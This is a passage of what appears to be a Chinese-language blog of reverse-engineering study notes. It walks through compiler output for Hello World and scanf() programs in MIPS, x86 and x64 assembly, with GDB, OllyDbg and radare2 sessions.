local stack:</span><br><span class="line">		lw		$28,16($fp)</span><br><span class="line">; set register $2 ($V0) to zero:</span><br><span class="line">		move	$2,$0</span><br><span class="line">; function epilogue. </span><br><span class="line">; restore the SP:</span><br><span class="line">		move	$sp,$fp</span><br><span class="line">; restore the RA:</span><br><span class="line">		lw		$31,28($sp) </span><br><span class="line">; restore the FP:</span><br><span class="line">		lw		$fp,24($sp)</span><br><span class="line">		addiu	$sp,$sp,32 </span><br><span class="line">; jump to the RA:</span><br><span class="line">		j			$31</span><br><span class="line">		nop					; branch delay slot</span><br></pre></td></tr></table></figure>
<p>未经优化处理的 GCC 输出要详细得多。此处，我们可以观察到程序把<code>FP</code>当作栈帧的指针来用，而且它还有3个 <code>NOP(空操作)</code>指令。在这3个空操作指令中，第二个、第三个指令都位于分支跳转指令之后。<br>笔者个人认为(虽然目前无法肯定)，由于这些地方都存在分支延迟槽，所以 GCC 编译器会在分支语句之后都添加NOP指令。不过，在启用它的优化选项之后，GCC 可能就会删除这些 NOP 指令。所以，此 处仍然存在这些 NOP 指令。</p>
<h5 id="Non-pimizing-GCC-IDA"><a href="#Non-pimizing-GCC-IDA" class="headerlink" title="Non-pimizing GCC (IDA)"></a>Non-pimizing GCC (IDA)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000 main: </span><br><span class="line">.text:00000000</span><br><span class="line">.text:00000000 var_10 = -0x10</span><br><span class="line">.text:00000000 var_8 = -8</span><br><span class="line">.text:00000000 var_4 = -4</span><br><span class="line">.text:00000000</span><br><span class="line">; function prologue.</span><br><span class="line">; save the RA and FP in the stack: </span><br><span class="line">.text:00000000 addiu  $sp, -0x20</span><br><span class="line">.text:00000004 sw    $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00000008 sw    $fp, 0x20+var_8($sp)</span><br><span class="line">; set the FP (stack frame pointer):</span><br><span class="line">.text:0000000C move  $fp, $sp</span><br><span class="line">; set the GP:</span><br><span class="line">.text:00000010 la    $gp, __gnu_local_gp</span><br><span class="line">.text:00000018 sw    $gp, 0x20+var_10($sp)</span><br><span class="line">; load the address of the text string:å</span><br><span class="line">.text:0000001C lui   $v0, (aHelloWorld &gt;&gt; 16) # &quot;Hello, world!&quot;</span><br><span class="line">.text:00000020 addiu $a0, $v0, (aHelloWorld &amp; 0xFFFF) # &quot;Hello, world!&quot; </span><br><span class="line">; load the address of puts() using the GP:</span><br><span class="line">.text:00000024 lw    $v0, (puts &amp; 0xFFFF)($gp)</span><br><span class="line">.text:00000028 or    $at, $zero ; NOP</span><br><span class="line">; call puts():</span><br><span class="line">.text:0000002C move  $t9, $v0</span><br><span class="line">.text:00000030 jalr  $t9</span><br><span class="line">.text:00000034 or    $at, $zero ; NOP</span><br><span class="line">; restore the GP from local stack: </span><br><span class="line">.text:00000038 lw    $gp, 0x20+var_10($fp)</span><br><span class="line">; set register $2 ($V0) to zero:</span><br><span class="line">.text:0000003C move  $v0, $zero</span><br><span class="line">; function epilogue. </span><br><span class="line">; restore the SP:</span><br><span class="line">.text:00000040 move  $sp, $fp</span><br><span class="line">; restore the RA:</span><br><span class="line">.text:00000044 lw    $ra, 0x20+var_4($sp)</span><br><span class="line">; restore the FP:</span><br><span class="line">.text:00000048 lw    $fp, 0x20+var_8($sp)</span><br><span class="line">.text:0000004C addiu $sp, 0x20</span><br><span class="line">; jump to the RA:</span><br><span class="line">.text:00000050 jr    $ra</span><br><span class="line">.text:00000054 or    $at, $zero ; NOP</span><br></pre></td></tr></table></figure>
<p>在程序的第 15 行出现了一个比较有意思的现象——IDA 识别出了 LUI&#x2F;ADDIU 指令对，把它们显示为 单条的伪指令LA(Load address)。那条伪指令占用了8个字节!这种伪指令(即“宏”)并非真正的MIPS 指令。通过这种名称替换,IDA 帮助我们这对指令的作用望文思义。<br>NOP 的显示方法也构成了它的另外一种特点。因为 IDA 并不会自动地把实际指令匹配为 NOP 指令， 所以位于第 22 行、第 26 行、第 41 行的指令都是<code>OR $AT, $ZERO</code>。表面上看，它将保留寄存器$AT 的 值与 0 进行或运算。但是从本质上讲，这就是发送给 CPU 的 NOP 指令。MIPS 和其他的一些硬件平台的 指令集都没有单独的 NOP 指令。</p>
<h5 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h5><p>本例使用寄存器来传递文本字符串的地址。但是它同时设置了局部栈，这是为什么呢?由于程序在调用 printf()函数的时候由于程序必须保存 RA 寄存器的值和 GP 的值，故而此处出现了数据栈。如果此函数是<code>叶函数</code>，它有可能不会出现函数的序言和尾声。</p>
<h3 id="GDB分析"><a href="#GDB分析" class="headerlink" title="GDB分析"></a>GDB分析</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>使用如下命令编译我们的文件<br><code>gcc hello.c -O3 -o hello</code><br>将会在同目录下生成hello文件。</p>
<h4 id="使用GDB调试"><a href="#使用GDB调试" class="headerlink" title="使用GDB调试"></a>使用GDB调试</h4><ol>
<li>执行命令：<code>gdb hello</code>开始调试。</li>
<li>执行命令：<code>b main</code>，在main函数处下断点。</li>
<li>执行命令：<code>run</code>，运行程序，程序会在断点处停止。</li>
<li>执行命令：<code>set step-mode on</code>，开启step-mode 模式。</li>
<li>执行命令：<code>disas</code>查看当前函数的反汇编指令。</li>
<li>执行命令：<code>s</code>，执行一条汇编指令。</li>
<li>执行命令：<code>x/s address</code>，查看某地址处的数据，并以<code>s(tring)</code>格式显示。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# gdb hw</span><br><span class="line">GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from hw...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x530</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /root/Desktop/hw </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555555554530 in main ()</span><br><span class="line">(gdb) set step-mode on</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">=&gt; 0x0000555555554530 &lt;+0&gt;:	lea    0x1ad(%rip),%rdi        # 0x5555555546e4</span><br><span class="line">   0x0000555555554537 &lt;+7&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x000055555555453b &lt;+11&gt;:	callq  0x555555554510 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555554540 &lt;+16&gt;:	xor    %eax,%eax</span><br><span class="line">   0x0000555555554542 &lt;+18&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000555555554546 &lt;+22&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) s</span><br><span class="line">0x0000555555554537 in main ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000555555554530 &lt;+0&gt;:	lea    0x1ad(%rip),%rdi        # 0x5555555546e4</span><br><span class="line">=&gt; 0x0000555555554537 &lt;+7&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x000055555555453b &lt;+11&gt;:	callq  0x555555554510 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555554540 &lt;+16&gt;:	xor    %eax,%eax</span><br><span class="line">   0x0000555555554542 &lt;+18&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000555555554546 &lt;+22&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x/s 0x5555555546e4</span><br><span class="line">0x5555555546e4:	&quot;Hello, world&quot;</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用radare2分析"><a href="#使用radare2分析" class="headerlink" title="使用radare2分析"></a>使用radare2分析</h3><ol>
<li>查看程序中的字符串：<code>rabin2 -z hello</code>;</li>
<li>使用<code>r2</code>命令分析：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# r2 hw</span><br><span class="line">[0x00000550]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x00000550]&gt; s main</span><br><span class="line">[0x00000530]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">            ;-- section..text:</span><br><span class="line">/ (fcn) sym.main 23</span><br><span class="line">|   sym.main ();</span><br><span class="line">|              ; DATA XREF from 0x0000056d (entry0)</span><br><span class="line">|           0x00000530      488d3dad0100.  lea rdi, qword str.Hello__world ; 0x6e4 ; &quot;Hello, world&quot; ; section 14 va=0x00000530 pa=0x00000530 sz=418 vsz=418 rwx=--r-x .text</span><br><span class="line">|           0x00000537      4883ec08       sub rsp, 8</span><br><span class="line">|           0x0000053b      e8d0ffffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x00000540      31c0           xor eax, eax</span><br><span class="line">|           0x00000542      4883c408       add rsp, 8</span><br><span class="line">\           0x00000546      c3             ret</span><br><span class="line">[0x00000530]&gt; ps @ 0x6e4</span><br><span class="line">Hello, world</span><br><span class="line">[0x00000530]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><ol>
<li>学习笔记</li>
<li>熟悉GDB和r2工具。</li>
</ol>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——scanf()</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94scanf().html</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int x;</span><br><span class="line">	printf(&quot;Enter X:\n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">	printf(&quot;You entered %d...\n&quot;,x);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">//now,x is global variable</span><br><span class="line">int x;</span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;Enter X:\n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">	printf(&quot;You entered %d...\n&quot;,x);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="scanf-函数的状态监测"><a href="#scanf-函数的状态监测" class="headerlink" title="scanf()函数的状态监测"></a>scanf()函数的状态监测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int x;</span><br><span class="line">	printf (&quot;Enter X:\n&quot;);</span><br><span class="line">	if (scanf (&quot;%d&quot;, &amp;x)==1)</span><br><span class="line">		printf (&quot;You entered %d...\n&quot;, x);</span><br><span class="line">	else</span><br><span class="line">		printf (&quot;What you entered? Huh?\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h3 id="x86局部变量"><a href="#x86局部变量" class="headerlink" title="x86局部变量"></a>x86局部变量</h3><h4 id="MSVC-2010"><a href="#MSVC-2010" class="headerlink" title="MSVC(2010)"></a>MSVC(2010)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONST SEGMENT</span><br><span class="line">$SG3831 DB &#x27;Enter X:&#x27;,0aH,00H</span><br><span class="line">$SG3832 DB &#x27;%d&#x27;,00H</span><br><span class="line">$SG3833 DB &#x27;You entered %d...&#x27;,0aH,00H</span><br><span class="line">CONST ENDS</span><br><span class="line">PUBLIC _main</span><br><span class="line">EXTRN _scanf:PROC</span><br><span class="line">EXTRN _printf:PROC</span><br><span class="line">;Function compile flags:/Odtp</span><br><span class="line">_TEXT SEGMENT</span><br><span class="line">_x$=-4           ;size=4</span><br><span class="line">_main PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	push ecx</span><br><span class="line">	push OFFSET $SG3831  ;&#x27;Enter X:&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	lea eax,DWORD PTR _x$[ebp]</span><br><span class="line">	push eax</span><br><span class="line">	push OFFSET $SG3832  ;&#x27;%d&#x27;</span><br><span class="line">	call _scanf</span><br><span class="line">	add esp,8</span><br><span class="line">	mov ecx,DWORD PTR _x$[ebp]</span><br><span class="line">	push ecx</span><br><span class="line">	push OFFSET $SG3833    ;&#x27;You entered %d...&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,8</span><br><span class="line"></span><br><span class="line">	;rentuen 0</span><br><span class="line">	xor eax,eax</span><br><span class="line">	mov esp,ebp</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_main ENDP</span><br><span class="line">_TEXT ENDS</span><br></pre></td></tr></table></figure>
<p>####OllyDbg调试<br>现在使用 OllyDbg 调试,加载程序之后,一直按 F8 键单步执行,等待程序退出 ntdll.dll、进入我们程序的主文件。然后向下翻滚滚轴,查找 main()主函数。在 main()里面点中第一条指令<code>PUSH EBP</code>并在此处按下 F2 键设置断点。接着按 F9 键,运行断点之前的指令。<br><img src="/images/84d0556980cc52a7e7a167fe381c49279f0a2759.png" alt="1.png"><br>在这个界面里,我们在寄存器的区域内用右键单击 EAX 寄存器,然后选择“Follow in stack”。如此一来,OllyDbg 就会在栈窗口里显示栈地址和栈内数据,以便我们清楚地观察栈里的局部变量。图中红箭头所示的就是栈里的数据。其中,在地址 0x6E494714 处的数据就是脏数据。在下一时刻,PUSH 指令会把数据存储到栈里的下一个地址。接下来,在程序执行完 scanf()函数之前,我们一直按 F8 键。在执行 scanf()函数的时候,我们要在运行程序的终端窗口里输入数据,例如 123,如下图：<br><img src="/images/ad8d59be6d7776bb5d256d332f1273bfdab3a1a1.png" alt="2.png"></p>
<p>scanf()函数的执行之后的情形如下图所示。EAX 寄存器里存有函数的返回值 1。这表示它成功地读取了 1 个值。我们可以在栈里找到局部变量的地址,其数值为 0x7B(即数字 123)。<br><img src="/images/dc0d0444a3e20bc216d63ce9c6d844b33d5e6709.png" alt="3.png"></p>
<p>这个值将通过栈传递给 ECX 寄存器,然后再次通过栈传递给 printf()函数,如下图<br><img src="/images/60bf0aaa51780c4105918c87c7c2e9fe0477e878.png" alt="4.png"></p>
<h3 id="x86全局变量"><a href="#x86全局变量" class="headerlink" title="x86全局变量"></a>x86全局变量</h3><h4 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_DATA	SEGMENT</span><br><span class="line">COMM	_x:DWORD</span><br><span class="line">$SG2456	DB &#x27;Enter X: &#x27;, 0aH, 00H</span><br><span class="line">$SG2457 DB &#x27;%d&#x27;, 00H</span><br><span class="line">$SG2458 DB &#x27;You entered %d... &#x27;, 0aH, 00H</span><br><span class="line">_DATA ENDS</span><br><span class="line">PUBLIC	_main</span><br><span class="line">EXTRN	__scanf:PROC</span><br><span class="line">EXTRN	__printf:PROC</span><br><span class="line">; Function compile flags: /Odtp</span><br><span class="line">_TEXT	SEGMENT</span><br><span class="line">_main	PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	push OFFSET $SG2456</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	push OFFSET _x</span><br><span class="line">	push OFFSET $SG2457</span><br><span class="line">	call _scanf</span><br><span class="line">	add esp,8</span><br><span class="line">	mov eax,DWORD PTR_x</span><br><span class="line">	push eax</span><br><span class="line">	push OFFSET $SG2458</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,8</span><br><span class="line">	xor eax,eax</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_main	ENDP</span><br><span class="line">_TEXT	ENDS</span><br></pre></td></tr></table></figure>
<p>x 变量的存储空间是数据段(_data 域),反而没有使用数据栈。因此整个程序的所有指令都可以直接访问全局变量 x。在可执行文件中,未经初始化的变量不会占用任何存储空间</p>
<h4 id="OllyDbg调试"><a href="#OllyDbg调试" class="headerlink" title="OllyDbg调试"></a>OllyDbg调试</h4><p>我们可以在 OllyDbg 观察程序的数据段里的变量：<br><img src="/images/94a527af0d2bf1fce9a1238d40fc26b09effa94e.png" alt="6.png"><br>全局变量 x 出现在数据段里。在调试器执行完 PUSH 指令之后,变量 x 的指针推即被推送入栈,我们就可在栈里右键单击 x 的地址并选择“Follow in dump”,并在左侧的内存窗口观察它。在控制台输入 123 之后,栈里的数据将会变成0x7B。若考虑到数权,此处应该是 00 00 00 7B。可见,这是 x86 系统低位优先的“小端字节序&#x2F;LITTLE-ENDIAN”的典型特征。小端字节序属于“字节(顺)序&#x2F;endianness”的一种,它的第一个字节是数权最低的字节,数权最高的字节会排列在最后。<br>此后,EAX 寄存器将存储这个地址里的 32 位值,并将之传递给 printf()函数。本例中,变量 x 的内存地址是011F7138.<br>在 OllyDbg 里,按下 Alt+M 组合键可查看这个进程的内存映射(process memory map)，如下图所示,这个地址位于程序 PE 段的.data 域：<br><img src="/images/aa1d3c22b7d7692c2dc49303cf434797a56fe2ea.png" alt="7.png"></p>
<h3 id="x86scanf-函数的状态监测"><a href="#x86scanf-函数的状态监测" class="headerlink" title="x86scanf()函数的状态监测"></a>x86scanf()函数的状态监测</h3><h4 id="MSVC-1"><a href="#MSVC-1" class="headerlink" title="MSVC"></a>MSVC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	lea eax,DOWORD PTR_x$[ebp]</span><br><span class="line">	push eax</span><br><span class="line">	push OFFSET $SG3833     ;&#x27;%d&#x27;,00H</span><br><span class="line">	call _scanf</span><br><span class="line">	add esp, 8</span><br><span class="line">	cmp eax, 1</span><br><span class="line">	jne SHORT $LN2@main</span><br><span class="line">	mov ecx, DWORD PTR _x$[ebp]</span><br><span class="line">	push ecx</span><br><span class="line">	push OFFSET $SG3834 ; &#x27;You entered %d... &#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp, 8</span><br><span class="line">	jmp SHORT $LN1@main</span><br><span class="line">$LN2@main:</span><br><span class="line">	push OFFSET $SG3836 ; &#x27;What you entered? Huh? &#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp, 4</span><br><span class="line">$LN1@main:</span><br><span class="line">	eax, eax</span><br></pre></td></tr></table></figure>
<p>不仅是 CMP<br>指令所有的“数学&#x2F;算术计算”指令都会设置标志位。如果将 1 与 1 进行比较,1−1&#x3D;0,ZF 标志位(“零”标识位,最终运算结果是 0)将被计算指令设定为 1。将两个不同的数值进行 CMP 比较时,ZF 标志位的值绝不会是 1。JNE 指令会依据 ZF 标志位的状态判断是否需要进行跳转,实际上此两者(Jump if Not Zero)的同义指令。JNE 和 JNZ 的 opcode 都相同。所以,即使使用减法运算操作指令 SUB 替换 CMP指令,Jcc 指令也可以进行正常的跳转。不过在使用 SUB 指令时,我们还需要分配一个寄存器保存运算结果,而 CMP 则不需要使用寄存器保存运算结果。</p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>在编译面向 x64 平台的可执行程序时,由于这个程序的参数较少,编译器会直接使用寄存器传递参数。除此之外,编译过程和 x86 的编译过程没有太大的区别。</p>
<h3 id="x64局部变量"><a href="#x64局部变量" class="headerlink" title="x64局部变量"></a>x64局部变量</h3><h4 id="msvc-2010"><a href="#msvc-2010" class="headerlink" title="msvc 2010"></a>msvc 2010</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_DATA SEGMENT</span><br><span class="line">$SG3831 DB &#x27;Enter X:&#x27;,0aH,00H</span><br><span class="line">$SG3832 DB &#x27;%d&#x27;,00H</span><br><span class="line">$SG3833 DB &#x27;You entered %d...&#x27;,0aH,00H</span><br><span class="line">_DATA ENDS</span><br><span class="line"></span><br><span class="line">_TEXT	SEGMENT</span><br><span class="line">x$=32</span><br><span class="line">mian	PROC</span><br><span class="line">$LN3:</span><br><span class="line">	sub rsp,56</span><br><span class="line">	lea rcx, OFFSET FLAT:$SG1289 ; &#x27;Enter X: &#x27;</span><br><span class="line">	call printf</span><br><span class="line">	lea rdx, QWORD PTR x$[rsp]</span><br><span class="line">	lea rcx, OFFSET FLAT:$SG1291 ; &#x27;%d&#x27;</span><br><span class="line">	call scanf</span><br><span class="line">	lea edx, DWORD PTR x$[rsp]</span><br><span class="line">	lea rcx, OFFSET FLAT:$SG1292 ; &#x27;You entered %d... &#x27;</span><br><span class="line">	call printf</span><br><span class="line">	;return 0</span><br><span class="line">	xor eax, eax</span><br><span class="line">	add rsp, 56</span><br><span class="line">	ret 0</span><br><span class="line">main	ENDP</span><br><span class="line">_TEXT	ENDS</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="使用radare2调试"><a href="#使用radare2调试" class="headerlink" title="使用radare2调试"></a>使用radare2调试</h4><p>使用gcc编译源代码，之后使用radare2进行调试，结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# r2 a.out</span><br><span class="line"> -- Press &#x27;C&#x27; in visual mode to toggle colors</span><br><span class="line">[0x000005f0]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x000005f0]&gt; s main</span><br><span class="line">[0x000006fa]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 73</span><br><span class="line">|   sym.main ();</span><br><span class="line">|           ; var int local_4h @ rbp-0x4</span><br><span class="line">|              ; DATA XREF from 0x0000060d (entry0)</span><br><span class="line">|           0x000006fa      55             push rbp</span><br><span class="line">|           0x000006fb      4889e5         mov rbp, rsp</span><br><span class="line">|           0x000006fe      4883ec10       sub rsp, 0x10</span><br><span class="line">|           0x00000702      488d3dcb0000.  lea rdi, str.Enter_X:       ; 0x7d4 ; &quot;Enter X:&quot;</span><br><span class="line">|           0x00000709      e8a2feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0000070e      488d45fc       lea rax, [local_4h]</span><br><span class="line">|           0x00000712      4889c6         mov rsi, rax</span><br><span class="line">|           0x00000715      488d3dc10000.  lea rdi, 0x000007dd         ; &quot;%d&quot;</span><br><span class="line">|           0x0000071c      b800000000     mov eax, 0</span><br><span class="line">|           0x00000721      e8aafeffff     call sym.imp.__isoc99_scanf</span><br><span class="line">|           0x00000726      8b45fc         mov eax, dword [local_4h]</span><br><span class="line">|           0x00000729      89c6           mov esi, eax</span><br><span class="line">|           0x0000072b      488d3dae0000.  lea rdi, str.You_entered__d..._n ; 0x7e0 ; &quot;You entered %d...\n&quot;</span><br><span class="line">|           0x00000732      b800000000     mov eax, 0</span><br><span class="line">|           0x00000737      e884feffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">|           0x0000073c      b800000000     mov eax, 0</span><br><span class="line">|           0x00000741      c9             leave</span><br><span class="line">\           0x00000742      c3             ret</span><br><span class="line">[0x000006fa]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="x64全局变量"><a href="#x64全局变量" class="headerlink" title="x64全局变量"></a>x64全局变量</h3><p>GCC编译，使用radare2调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r2 b.out</span><br><span class="line"> -- Use &#x27;rabin2 -ris&#x27; to get the import/export symbols of any binary.</span><br><span class="line">[0x000005f0]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x000005f0]&gt; s main</span><br><span class="line">[0x000006fa]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 72</span><br><span class="line">|   sym.main ();</span><br><span class="line">|              ; DATA XREF from 0x0000060d (entry0)</span><br><span class="line">|           0x000006fa      55             push rbp</span><br><span class="line">|           0x000006fb      4889e5         mov rbp, rsp</span><br><span class="line">|           0x000006fe      488d3dcf0000.  lea rdi, str.Enter_X:       ; 0x7d4 ; &quot;Enter X:&quot;</span><br><span class="line">|           0x00000705      e8a6feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0000070a      488d35330920.  lea rsi, obj.x              ; 0x201044</span><br><span class="line">|           0x00000711      488d3dc50000.  lea rdi, 0x000007dd         ; &quot;%d&quot;</span><br><span class="line">|           0x00000718      b800000000     mov eax, 0</span><br><span class="line">|           0x0000071d      e8aefeffff     call sym.imp.__isoc99_scanf</span><br><span class="line">|           0x00000722      8b051c092000   mov eax, dword [obj.x]      ; [0x201044:4]=0</span><br><span class="line">|           0x00000728      89c6           mov esi, eax</span><br><span class="line">|           0x0000072a      488d3daf0000.  lea rdi, str.You_entered__d..._n ; 0x7e0 ; &quot;You entered %d...\n&quot;</span><br><span class="line">|           0x00000731      b800000000     mov eax, 0</span><br><span class="line">|           0x00000736      e885feffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">|           0x0000073b      b800000000     mov eax, 0</span><br><span class="line">|           0x00000740      5d             pop rbp</span><br><span class="line">\           0x00000741      c3             ret</span><br><span class="line">[0x000006fa]&gt; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="x64-scanf-函数的状态监测"><a href="#x64-scanf-函数的状态监测" class="headerlink" title="x64: scanf()函数的状态监测"></a>x64: scanf()函数的状态监测</h3><p>:GCC编译，使用radare2调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# r2 c.out</span><br><span class="line"> -- You can debug a program from the graph view (&#x27;ag&#x27;) using standard radare2 commands</span><br><span class="line">[0x000005f0]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x000005f0]&gt; s main</span><br><span class="line">[0x000006fa]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) main 92</span><br><span class="line">|   main ();</span><br><span class="line">|           ; var int local_4h @ rbp-0x4</span><br><span class="line">|              ; DATA XREF from 0x0000060d (entry0)</span><br><span class="line">|           0x000006fa      55             push rbp</span><br><span class="line">|           0x000006fb      4889e5         mov rbp, rsp</span><br><span class="line">|           0x000006fe      4883ec10       sub rsp, 0x10</span><br><span class="line">|           0x00000702      488d3ddb0000.  lea rdi, str.Enter_X:       ; 0x7e4 ; &quot;Enter X:&quot;</span><br><span class="line">|           0x00000709      e8a2feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0000070e      488d45fc       lea rax, [local_4h]</span><br><span class="line">|           0x00000712      4889c6         mov rsi, rax</span><br><span class="line">|           0x00000715      488d3dd10000.  lea rdi, 0x000007ed         ; &quot;%d&quot;</span><br><span class="line">|           0x0000071c      b800000000     mov eax, 0</span><br><span class="line">|           0x00000721      e8aafeffff     call sym.imp.__isoc99_scanf</span><br><span class="line">|           0x00000726      83f801         cmp eax, 1</span><br><span class="line">|       ,=&lt; 0x00000729      7518           jne 0x743</span><br><span class="line">|       |   0x0000072b      8b45fc         mov eax, dword [local_4h]</span><br><span class="line">|       |   0x0000072e      89c6           mov esi, eax</span><br><span class="line">|       |   0x00000730      488d3db90000.  lea rdi, str.You_entered__d..._n ; 0x7f0 ; &quot;You entered %d...\n&quot;</span><br><span class="line">|       |   0x00000737      b800000000     mov eax, 